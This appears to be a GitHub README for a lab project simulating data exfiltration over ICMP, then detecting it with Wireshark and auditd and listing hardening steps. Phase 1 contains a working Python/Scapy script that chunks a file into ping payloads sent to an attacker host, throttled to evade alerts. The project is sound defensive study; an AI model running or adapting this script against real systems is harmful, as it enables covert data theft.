# Data Exfiltration Over ICMP: Simulation, Detection & Analysis

## 📌 Project Overview
This project demonstrates an end-to-end scenario of **Data Exfiltration over an Alternative Protocol (ICMP)**, mapping directly to the **MITRE ATT&CK Framework: T1048**. 

The goal of this project was to act as both Red Team (simulating the threat via a custom Python/Scapy script) and Blue Team (detecting the exfiltration using network analysis with **Wireshark** and host-based monitoring with Linux **Auditd**).

### Key Skills Demonstrated:
* **Network Security:** Analyzing ICMP payload anomalies and protocol abuse.
* **Automation/Scripting:** Creating custom packet-crafting tools using Python and `Scapy`.
* **Endpoint Detection:** Configuring host-based audit policies (`auditd`) to track unauthorized file access.
* **Defensive Engineering:** Translating raw traffic and endpoint logs into actionable security insights.

---

## 🏗️ Lab Architecture
The project was executed in a fully isolated, low-overhead virtual environment (VirtualBox Host-Only Network) designed to optimize resource usage (under 8GB RAM).

* **Victim Endpoint:** Ubuntu Server/Desktop (Isolated Host-Only IP).
* **Attacker / Monitoring Node:** Kali Linux (Acting as the C2 listener and traffic sniffer).

---

## 🎯 Phase 1: Simulation (Red Team)
Instead of using noisy system tools, a custom Python script was developed using the `Scapy` library to bypass standard application-layer firewall rules. The script reads a sensitive document, splits the string into small chunks, and injects them directly into the `Data` field of standard ICMP Echo Requests.

### The Exfiltration Script (`exfil.py`):
```
import time
from scapy.all import IP, ICMP, send

ATTACKER_IP = "192.168.56.102"  # Kali Linux IP
FILE_TO_STEAL = "sensitive_data.txt"

def exfiltrate():
    with open(FILE_TO_STEAL, "r") as f:
        data = f.read().strip()
    
    print(f"[*] Starting exfiltration of: {FILE_TO_STEAL}")
    
    # Splitting data into 4-character chunks
    chunk_size = 4
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

    for chunk in chunks:
        # Crafting custom IP/ICMP packet with text payload
        packet = IP(dst=ATTACKER_IP) / ICMP(type=8) / chunk
        print(f"[+] Sending chunk: {chunk}")
        send(packet, verbose=False)
        time.sleep(1)  # Throttling to evade basic threshold alerts

    print("[*] Exfiltration complete.")

if __name__ == "__main__":
    exfiltrate()
```
> <img width="1919" height="1022" alt="Снимок экрана 2026-05-30 162532" src="https://github.com/user-attachments/assets/1cb14c9c-1e5b-41c9-8066-9f143544f0bb" />

---

## 🔍 Phase 2: Detection & Analysis (Blue Team)
The core value of this project is the detection mechanism on both network and host levels.

### 1. Network Analysis (Wireshark)
Standard ICMP (ping) traffic contains predictable, sequential, or padded junk data. During the analysis of the captured PCAP, several major anomalies were identified:

* **Payload Modification:** The hex dump of the ICMP packets explicitly contained plaintext strings (`SECR`, `ET_F`, `LAG{`) instead of standard OS padding.
* **Length Anomalies:** Packet sizes deviated from standard OS ping signatures.

> <img width="1918" height="997" alt="Снимок экрана 2026-05-30 162651" src="https://github.com/user-attachments/assets/01bfdb50-6591-491c-a93a-93858e2af4c3" />
<img width="1919" height="1021" alt="Снимок экрана 2026-05-30 162723" src="https://github.com/user-attachments/assets/38e67fc9-3d60-491d-bb81-262e625ed5ce" />


### 2. Host-Based Detection (Linux Auditd)
To ensure visibility even if the network traffic was encrypted or missed, a strict file integrity and access policy was deployed using `auditd`.

A watch rule was placed on the sensitive file to monitor read (`r`) operations with a custom filter key `exfil_attempt`:

```bash
sudo auditctl -w /home/user/sensitive_data.txt -p r -k exfil_attempt
```
When the exfiltration script was executed, `auditd` successfully captured the event. Running `sudo ausearch -k exfil_attempt` revealed the exact source of the compromise:

> <img width="1857" height="740" alt="Снимок экрана 2026-05-30 165522" src="https://github.com/user-attachments/assets/20627e76-d2bf-43c3-ba67-0355cca70ed2" />


### Critical Log Artifacts Identified:
* `type=SYSCALL`: Triggered a system-level file read.
* `exe="/usr/bin/python3.12"`: Identified the exact binary/interpreter used to access the file, confirming it wasn't a standard text editor or authorized service.
* `key="exfil_attempt"`: Successfully mapped to our specific security monitoring alert.

---

## 🛡️ Mitigation & Hardening Recommendations
To defend against protocol-abuse techniques like ICMP/DNS tunneling in a production environment:

* **Network Level:** Implement **Deep Packet Inspection (DPI)** on firewalls to drop ICMP packets containing non-standard payload data or size anomalies. Block outbound ICMP entirely if not strictly required for network diagnostics.
* **Endpoint Level:** Deploy **EDR/SIEM rules** (e.g., Wazuh/Sysmon) to alert on non-standard processes (like Python, PowerShell, or unknown binaries) accessing sensitive business directories.
* **SIEM Correlation:** Create correlation rules that trigger a high-severity alert when a **File Read Event** by an untrusted process is followed by immediate outbound network traffic over non-standard or diagnostic protocols.
